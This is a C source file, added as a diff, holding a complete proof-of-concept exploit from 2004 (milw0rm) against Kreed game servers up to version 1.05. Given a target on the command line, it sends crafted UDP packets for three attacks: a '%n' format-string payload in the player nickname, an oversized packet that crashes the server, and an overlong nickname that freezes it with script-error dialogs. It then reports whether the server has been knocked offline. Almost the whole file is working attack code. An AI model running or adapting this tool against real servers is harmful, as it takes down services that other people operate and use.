@@ -1,0 +1,494 @@
+/*
+
+by Luigi Auriemma
+
+*/
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <time.h>
+/*
+
+Read/Write bits to buffer 0.1.1
+by Luigi Auriemma
+e-mail: aluigi@altervista.org
+web:    http://aluigi.altervista.org
+
+max 32 bits numbers supported (from 0 to 4294967295).
+Probably not the fastest bit packing functions existent, but I like them.
+
+*/
+
+
+
+unsigned long read_bits(    // number read
+  unsigned long bits,       // how much bits to read
+  unsigned char *in,        // buffer from which to read the number
+  unsigned long in_bits     // position of the buffer in bits
+) {
+    unsigned long   seek_bits,
+                    rem,
+                    seek = 0,
+                    ret  = 0,
+                    mask = -1L;
+
+    if(bits > 32) return(0);
+    if(bits < 32) mask = (1 << bits) - 1;
+    for(;;) {
+        seek_bits = in_bits & 7;
+        ret |= ((*(in + (in_bits >> 3)) >> seek_bits) & mask) << seek;
+        rem = 8 - seek_bits;
+        if(rem >= bits) break;
+        bits    -= rem;
+        in_bits += rem;
+        seek    += rem;
+        mask    = (1 << bits) - 1;
+    }
+    return(ret);
+}
+
+
+
+unsigned long write_bits(   // position where the stored number finishs
+  unsigned long data,       // number to store
+  unsigned long bits,       // how much bits to occupy
+  unsigned char *out,       // buffer on which to store the number
+  unsigned long out_bits    // position of the buffer in bits
+) {
+    unsigned long   seek_bits,
+                    rem;
+
+    if(bits > 32) return(out_bits);
+    if(bits < 32) data &= ((1 << bits) - 1);
+    for(;;) {
+        seek_bits = out_bits & 7;
+        *(out + (out_bits >> 3)) &= (1 << seek_bits) - 1;   // zero
+        *(out + (out_bits >> 3)) |= (data << seek_bits);
+        rem = 8 - seek_bits;
+        if(rem >= bits) break;
+        out_bits += rem;
+        bits     -= rem;
+        data     >>= rem;
+    }
+    return(out_bits + bits);
+}
+
+
+
+
+#ifdef WIN32
+    #include <winsock.h>
+/*
+   Header file used for manage errors in Windows
+   It support socket and errno too
+   (this header replace the previous sock_errX.h)
+*/
+
+#include <string.h>
+#include <errno.h>
+
+
+
+void std_err(void) {
+    char    *error;
+
+    switch(WSAGetLastError()) {
+        case 10004: error = "Interrupted system call"; break;
+        case 10009: error = "Bad file number"; break;
+        case 10013: error = "Permission denied"; break;
+        case 10014: error = "Bad address"; break;
+        case 10022: error = "Invalid argument (not bind)"; break;
+        case 10024: error = "Too many open files"; break;
+        case 10035: error = "Operation would block"; break;
+        case 10036: error = "Operation now in progress"; break;
+        case 10037: error = "Operation already in progress"; break;
+        case 10038: error = "Socket operation on non-socket"; break;
+        case 10039: error = "Destination address required"; break;
+        case 10040: error = "Message too long"; break;
+        case 10041: error = "Protocol wrong type for socket"; break;
+        case 10042: error = "Bad protocol option"; break;
+        case 10043: error = "Protocol not supported"; break;
+        case 10044: error = "Socket type not supported"; break;
+        case 10045: error = "Operation not supported on socket"; break;
+        case 10046: error = "Protocol family not supported"; break;
+        case 10047: error = "Address family not supported by protocol family"; break;
+        case 10048: error = "Address already in use"; break;
+        case 10049: error = "Can't assign requested address"; break;
+        case 10050: error = "Network is down"; break;
+        case 10051: error = "Network is unreachable"; break;
+        case 10052: error = "Net dropped connection or reset"; break;
+        case 10053: error = "Software caused connection abort"; break;
+        case 10054: error = "Connection reset by peer"; break;
+        case 10055: error = "No buffer space available"; break;
+        case 10056: error = "Socket is already connected"; break;
+        case 10057: error = "Socket is not connected"; break;
+        case 10058: error = "Can't send after socket shutdown"; break;
+        case 10059: error = "Too many references, can't splice"; break;
+        case 10060: error = "Connection timed out"; break;
+        case 10061: error = "Connection refused"; break;
+        case 10062: error = "Too many levels of symbolic links"; break;
+        case 10063: error = "File name too long"; break;
+        case 10064: error = "Host is down"; break;
+        case 10065: error = "No Route to Host"; break;
+        case 10066: error = "Directory not empty"; break;
+        case 10067: error = "Too many processes"; break;
+        case 10068: error = "Too many users"; break;
+        case 10069: error = "Disc Quota Exceeded"; break;
+        case 10070: error = "Stale NFS file handle"; break;
+        case 10091: error = "Network SubSystem is unavailable"; break;
+        case 10092: error = "WINSOCK DLL Version out of range"; break;
+        case 10093: error = "Successful WSASTARTUP not yet performed"; break;
+        case 10071: error = "Too many levels of remote in path"; break;
+        case 11001: error = "Host not found"; break;
+        case 11002: error = "Non-Authoritative Host not found"; break;
+        case 11003: error = "Non-Recoverable errors: FORMERR, REFUSED, NOTIMP"; break;
+        case 11004: error = "Valid name, no data record of requested type"; break;
+        default: error = strerror(errno); break;
+    }
+    fprintf(stderr, "\nError: %s\n", error);
+    exit(1);
+}
+
+
+
+
+    #define close   closesocket
+    #define ONESEC  1000
+#else
+    #include <unistd.h>
+    #include <sys/socket.h>
+    #include <sys/types.h>
+    #include <arpa/inet.h>
+    #include <netinet/in.h>
+    #include <netdb.h>
+
+    #define ONESEC  1
+#endif
+
+
+
+#define VER         "0.1"
+#define BUFFSZ      2048    // 1400 is enough for Kreed
+#define PORT        28902
+#define TIMEOUT     3
+#define KREEDVER    33
+#define NICKNAME    "%n%n%n"
+#define INFO        "get_info"
+#define CHALL       "get_challenge\n"
+#define CONNECT     "connect %d %d %d name '%s' model 'mifs/players/leg_cmn_c1_MP.mif' string 'no info' gender 'male' rate 100000\n"
+#define SCRIPTERR   100     // 30 is enough
+
+
+
+#define SEND(x,y)   if(sendto(sd, x, y, 0, (struct sockaddr *)&peer, sizeof(peer)) \
+                      < 0) std_err();
+
+#define RECV        len = recvfrom(sd, buff, BUFFSZ, 0, NULL, NULL); \
+                    if(len < 0) std_err();
+
+#define RECVT       if(timeout(sd) < 0) { \
+                        fputs("\n" \
+                            "Error: socket timeout, no reply received\n" \
+                            "\n", stdout); \
+                        exit(1); \
+                    } \
+                    RECV;
+
+
+
+
+int build_kreed_pck(u_char *buff, int type, u_char *data);
+void read_kreed_pck(u_char *buff, int len);
+void kreed_info(void);
+int timeout(int sock);
+u_long resolv(char *host);
+void std_err(void);
+
+
+
+struct  sockaddr_in peer;
+
+
+
+int main(int argc, char *argv[]) {
+    int     sd,
+            len,
+            challenge,
+            attack,
+            version = KREEDVER;
+    u_short port = PORT;
+    u_char  *buff,
+            *tmp,
+            *p,
+            *nick = NICKNAME;
+
+
+    setbuf(stdout, NULL);
+
+    fputs("\n"
+        "Kreed <= 1.05 format string, message too long and scripts bugs "VER"\n"
+        "by Luigi Auriemma\n"
+        "e-mail: aluigi@altervista.org\n"
+        "web:    http://aluigi.altervista.org\n"
+        "\n", stdout);
+
+    if(argc < 3) {
+        printf("\n"
+            "Usage: %s <attack> <host> [port(%d)]\n"
+            "\n"
+            "Attack:\n"
+            " 1 = in-game format string in client's nickname\n"
+            " 2 = Denial of Service caused by a packet of 1401 or more bytes\n"
+            " 3 = in-game annoying script dialog errors caused by too long nickname or model\n"
+            "     values. The server is freezed until the messages are on the screen.\n"
+            "\n", argv[0], port);
+        exit(1);
+    }
+
+#ifdef WIN32
+    WSADATA    wsadata;
+    WSAStartup(MAKEWORD(1,0), &wsadata);
+#endif
+
+    attack = atoi(argv[1]);
+    if((attack < 1) || (attack > 3)) {
+        fputs("\nError: you can only choose between the available attacks\n\n", stdout);
+        exit(1);
+    }
+
+    if(argc > 3) port = atoi(argv[3]);
+
+    peer.sin_addr.s_addr = resolv(argv[2]);
+    peer.sin_port        = htons(port);
+    peer.sin_family      = AF_INET;
+
+    printf("- target   %s : %hu\n",
+        inet_ntoa(peer.sin_addr), port);
+
+    fputs("- request informations:\n", stdout);
+    kreed_info();
+
+    buff = malloc(BUFFSZ);
+    if(!buff) std_err();
+
+    if(attack == 2) {
+        fputs("- start \"Message too long\" DoS attack:\n", stdout);
+
+        sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
+        if(sd < 0) std_err();
+
+        memset(buff, 0x00, BUFFSZ);
+        fputs("- send BOOM packet\n", stdout);
+        SEND(buff, BUFFSZ);
+        close(sd);
+
+    } else {
+        if(attack == 1) {
+            fputs("- start format string attack:\n", stdout);
+        } else if(attack == 3) {
+            fputs("- start annoying script errors attack:\n", stdout);
+
+            nick = malloc(SCRIPTERR + 1);
+            if(!nick) std_err();
+            memset(nick, 'a', SCRIPTERR);
+            nick[SCRIPTERR] = 0x00;
+        }
+
+        tmp = malloc(BUFFSZ);
+        if(!tmp) std_err();
+
+        for(;;) {   // loop needed for the version handling
+            sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
+            if(sd < 0) std_err();
+
+            len = build_kreed_pck(
+                buff,
+                148,    // challenge
+                CHALL);
+
+            fputs("- send challenge request\n", stdout);
+            SEND(buff, len);
+            RECVT;
+
+            read_kreed_pck(buff, len);
+            sscanf(buff, "challenge %d", &challenge);
+
+            sprintf(
+                tmp,
+                CONNECT,
+                version,
+                (int)(time(NULL) & 0xffff),    // random port
+                challenge,
+                nick);
+
+            len = build_kreed_pck(
+                buff,
+                988,    // connect
+                tmp);
+
+            fputs("- send join request\n", stdout);
+            SEND(buff, len);
+            if(timeout(sd) < 0) {
+                fputs("- server is temporary full or is already crashed, I check it\n", stdout);
+                close(sd);
+                break;
+            }
+            RECV;
+
+            close(sd);
+
+            read_kreed_pck(buff, len);
+            if(!strstr(buff, "client_connect")) {
+                p = strstr(buff, "version");
+                if(p) {
+                    sscanf(p + 8, "%d", &version);
+                    printf("- set version number to %d\n", version);
+                    continue;
+                }
+                printf("\n"
+                    "Error: your player has not been accepted for the following reason:\n"
+                    "\n"
+                    "%s\n"
+                    "\n", buff);
+                exit(1);
+            }
+
+            break;  // break if success
+        }
+    }
+
+    sleep(ONESEC);
+
+    fputs("- check server:\n", stdout);
+    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
+    if(sd < 0) std_err();
+
+    len = build_kreed_pck(
+        buff,
+        148,    // challenge
+        CHALL);
+
+    SEND(buff, len);
+
+    if(timeout(sd) < 0) {
+        fputs("\nServer IS vulnerable!!!\n\n", stdout);
+    } else {
+        fputs("\nServer doesn't seem vulnerable\n\n", stdout);
+    }
+
+    close(sd);
+    return(0);
+}
+
+
+
+int build_kreed_pck(u_char *buff, int type, u_char *data) {
+    u_long  bits;
+
+    memset(buff, 0x00, BUFFSZ);
+
+    bits = write_bits(12, 32, buff, 0);
+    bits = write_bits(type, 16, buff, bits);
+    bits = write_bits(0xfffffff, 28, buff, bits);
+    while(*data) {
+        bits = write_bits(*data, 8, buff, bits);
+        data++;
+    }
+
+    if(bits & 7) return((bits >> 3) + 1);
+    return(bits >> 3);
+}
+
+
+
+void read_kreed_pck(u_char *buff, int len) {
+    u_long  bits = 32,
+            check;
+    u_char  *p;
+
+    check = read_bits(32, buff, 0);
+    if(check != 12) {
+        printf("\nError: server has replied with unexpected data (0x%08lx)\n\n", check);
+        exit(1);
+    }
+    read_bits(16, buff, bits);  bits += 16;
+    read_bits(28, buff, bits);  bits += 28;
+    for(len -= (bits >> 3), p = buff; len; len--) {
+        *p++ = read_bits(8, buff, bits);
+        bits += 8;
+    }
+    *p = 0x00;  // useless
+}
+
+
+
+void kreed_info(void) {
+    int     sd,
+            len;
+    u_char  *buff;
+
+    buff = malloc(BUFFSZ);
+    if(!buff) std_err();
+
+    len = build_kreed_pck(
+        buff,
+        124,    // info
+        INFO);
+
+    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
+    if(sd < 0) std_err();
+    SEND(buff, len);
+    RECVT;
+    close(sd);
+
+    read_kreed_pck(buff, len);
+    printf("%s\n\n", buff);
+
+    free(buff);
+}
+
+
+
+int timeout(int sock) {
+    struct  timeval tout;
+    fd_set  fd_read;
+    int     err;
+
+    tout.tv_sec = TIMEOUT;
+    tout.tv_usec = 0;
+    FD_ZERO(&fd_read);
+    FD_SET(sock, &fd_read);
+    err = select(sock + 1, &fd_read, NULL, NULL, &tout);
+    if(err < 0) std_err();
+    if(!err) return(-1);
+    return(0);
+}
+
+
+
+u_long resolv(char *host) {
+    struct hostent *hp;
+    u_long host_ip;
+
+    host_ip = inet_addr(host);
+    if(host_ip == INADDR_NONE) {
+        hp = gethostbyname(host);
+        if(!hp) {
+            printf("\nError: Unable to resolv hostname (%s)\n", host);
+            exit(1);
+        } else host_ip = *(u_long *)hp->h_addr;
+    }
+    return(host_ip);
+}
+
+
+
+#ifndef WIN32
+    void std_err(void) {
+        perror("\nError");
+        exit(1);
+    }
+#endif
+
+// milw0rm.com [2004-12-02]
